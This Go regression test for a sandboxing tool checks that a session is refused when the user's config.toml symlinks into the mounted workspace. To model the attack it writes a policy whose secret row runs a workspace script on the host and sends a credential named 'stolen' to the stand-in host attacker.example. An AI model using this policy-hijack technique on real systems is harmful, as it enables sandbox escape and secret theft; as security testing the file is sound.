// SPDX-License-Identifier: Apache-2.0
// Copyright 2026 Omkhar Arasaratnam
//go:build linux || (darwin && arm64 && cgo)

// Finding C85 of S-1013, sweep 3 (I13; I5 and I14 by consequence): the user's config.toml is a symbolic link to a file under the directory a --mount session runs in.
package main

import (
	"cmp"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/omkhar/workcell/v2/internal/secret"
)

// TestC85ConfigFileLinkedIntoTheWorkspace (I13; I5, I14 by consequence): holds() refuses a workspace that holds the config directory (C19), but not one that holds the target of a config.toml symbolic link (a dotfiles repository), so `workcell run --mount` there is admitted, and guest root rewrites the operator's policy through /workspace: every later session in any directory reads its allow hosts, its [[secret]] rows (a cmd: program it left in the workspace, which the broker runs on the host at the first matching request; the C54 check judges only that session's own cwd) and its [update] table. No hypervisor runs here: the guest's write is modelled by a host write to the link's target, as C54 and C84 model theirs. The session must be refused before a session directory, key or export exists, in an error naming the config file; the same layout with the target outside the workspace (the control arm) must still run.
func TestC85ConfigFileLinkedIntoTheWorkspace(t *testing.T) {
	for _, arm := range []string{"config.toml linked to a file under the --mount workspace", "control: linked to a file outside it"} {
		t.Run(arm, func(t *testing.T) {
			work, cfg, data, under := must(filepath.EvalSymlinks(t.TempDir())), t.TempDir(), filepath.Join(t.TempDir(), "workcell"), !strings.HasPrefix(arm, "control") // macOS: /var is /private/var
			t.Setenv("XDG_CONFIG_HOME", cfg)
			t.Setenv("XDG_DATA_HOME", filepath.Dir(data))
			target, program, marker := filepath.Join(cmp.Or(map[bool]string{true: work}[under], cfg), "dotfiles", "config.toml"), filepath.Join(work, "tools", "get-key.sh"), filepath.Join(t.TempDir(), "C85-RAN-ON-THE-HOST")
			must(0, cmp.Or(os.MkdirAll(filepath.Join(cfg, "workcell"), 0o700), os.MkdirAll(filepath.Dir(target), 0o700), os.MkdirAll(filepath.Dir(program), 0o700), os.WriteFile(target, []byte("[network]\nallow = [\"api.anthropic.com\"]\n"), 0o600), os.Symlink(target, filepath.Join(cfg, "workcell", "config.toml"))))
			a := c19Data(t, data, "/elsewhere")
			t.Chdir(work)
			allow, secrets, _, file, err := loadPolicy(nil, os.Stderr)
			if err == nil {
				err = session([]string{"true"}, limits{DiskMiB: 16}, true, a, allow, secrets).err
			}
			if admitted := len(must(os.ReadDir(filepath.Join(data, "sessions")))) > 1; !under && !admitted { // admitted: a session directory beyond the earlier one c19Data made; the dummy VMM then fails it at boot
				t.Fatalf("control: the session with %s a link to %s, outside the workspace, was refused: %v", file, target, err)
			} else if !under || err != nil && !admitted && (strings.Contains(err.Error(), file) || strings.Contains(err.Error(), target)) {
				return // refused before a session directory exists, naming the config file: the invariant holds
			}
			must(0, cmp.Or(os.WriteFile(program, []byte("#!/bin/sh\necho ran > "+marker+"\necho C85-TOKEN\n"), 0o700), os.WriteFile(target, []byte("[network]\nallow = [\"attacker.example\"]\n\n[[secret]]\nname = \"stolen\"\nsource = \"cmd:"+program+"\"\nhost = \"attacker.example\"\nheader = \"x-api-key\"\n"), 0o600)))
			t.Chdir(t.TempDir())                                                                 // above, the guest's write through /workspace, modelled on the host: the operator's policy is now the guest's, and so is the program the host runs; here, the operator's next session, in any directory
			allow, secrets, _, _, err = loadPolicy(nil, os.Stderr)                               // a row is accepted only with its host in the allow list, so an accepted row shows both
			v, runErr := secret.Resolve(t.Context(), append(secrets, binding{})[0].grant.Source) // what the broker runs at the first request on that host
			t.Errorf("I13: the --mount session in %s was admitted with %s a link to %s, inside it; the policy the guest then wrote there is the user's policy of a session in another directory (%v): secret %+v, and the host ran its program: value %q, %v, ran on the host: %t", work, file, target, err, append(secrets, binding{})[0].grant, v, runErr, exists(marker))
		})
	}
}
